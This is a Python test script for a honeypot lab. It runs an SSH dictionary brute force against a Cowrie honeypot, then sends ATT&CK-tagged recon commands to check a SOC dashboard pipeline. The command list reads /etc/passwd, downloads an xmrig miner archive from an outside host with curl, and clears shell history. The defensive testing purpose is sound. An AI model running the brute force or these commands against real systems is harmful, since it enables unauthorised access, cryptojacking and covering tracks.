"""
Attacker Traffic Simulation & Lab Validation Suite.
Simulates brute force dictionary attacks, fake shell access, reconnaissance commands,
and tool transfer attempts to immediately validate the honeypot pipeline and SOC dashboard.
"""

import argparse
import os
import sys
import time
import paramiko

# Sample dictionary for brute force simulation
DICTIONARY = [
    ("root", "123456"),
    ("admin", "admin123"),
    ("user", "password"),
    ("oracle", "welcome1"),
    ("support", "support"),
    ("root", "root")  # Honey credential in userdb.txt that succeeds
]

# Reconnaissance commands representing MITRE ATT&CK techniques
ATTACK_COMMANDS = [
    "uname -a",                    # T1082 System Information Discovery
    "whoami",                      # T1033 System Owner Discovery
    "id",                          # T1033 System Owner Discovery
    "cat /proc/cpuinfo",           # T1082 System Information Discovery
    "ps aux",                      # T1057 Process Discovery
    "ls -la /tmp",                 # T1083 File & Directory Discovery
    "cat /etc/passwd",             # T1083 File & Directory Discovery
    "curl -O http://update-cdn.net/xmrig.tar.gz",  # T1105 Ingress Tool Transfer
    "history -c"                   # T1070.003 Defense Evasion
]


def simulate_brute_force_and_shell(host: str, port: int):
    print(f"\n[*] Starting Attacker Simulation against {host}:{port}")
    print("=" * 60)

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    success_creds = None

    # Step 1: Password Brute Force
    print("\n[Stage 1] Executing Dictionary Brute-Force Attack (T1110)...")
    for username, password in DICTIONARY:
        try:
            print(f"  [-] Trying credential -> {username}:{password}")
            ssh_client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=5,
                allow_agent=False,
                look_for_keys=False
            )
            print(f"  [+] SUCCESSFUL LOGIN! Breached as '{username}' with password '{password}'")
            success_creds = (username, password)
            break
        except paramiko.AuthenticationException:
            print("  [x] Access Denied (Expected for failed attempt)")
            time.sleep(0.5)
        except Exception as e:
            print(f"  [!] Connection error: {e}")
            break

    if not success_creds:
        print("[!] Could not authenticate into honeypot shell. Is Cowrie running?")
        return

    # Step 2: Interactive Reconnaissance & Ingress Tool Transfer
    print("\n[Stage 2] Spawning Interactive Shell & Executing TTP Recon Commands...")
    try:
        channel = ssh_client.invoke_shell()
        time.sleep(1)

        for cmd in ATTACK_COMMANDS:
            print(f"  [>] Executing command: '{cmd}'")
            channel.send(cmd + "\n")
            time.sleep(1.2)
            if channel.recv_ready():
                output = channel.recv(4096).decode("utf-8", errors="ignore")
                # Print first 2 lines of output
                sample_lines = [l.strip() for l in output.splitlines() if l.strip()][:2]
                for l in sample_lines:
                    print(f"      | {l}")

        channel.send("exit\n")
        time.sleep(1)
        ssh_client.close()
        print("\n[+] Attacker session completed and logged.")
    except Exception as e:
        print(f"[!] Error during command execution: {e}")

    print("\n" + "=" * 60)
    print("[*] Simulation finished! Check your SOC Dashboard at http://<ec2-ip>:8501")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate attacker activity against Cowrie Honeypot")
    parser.add_argument("--host", default="127.0.0.1", help="Target honeypot IP or hostname (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=22, help="Target honeypot port (default: 22 or 2222)")
    args = parser.parse_args()

    simulate_brute_force_and_shell(args.host, args.port)
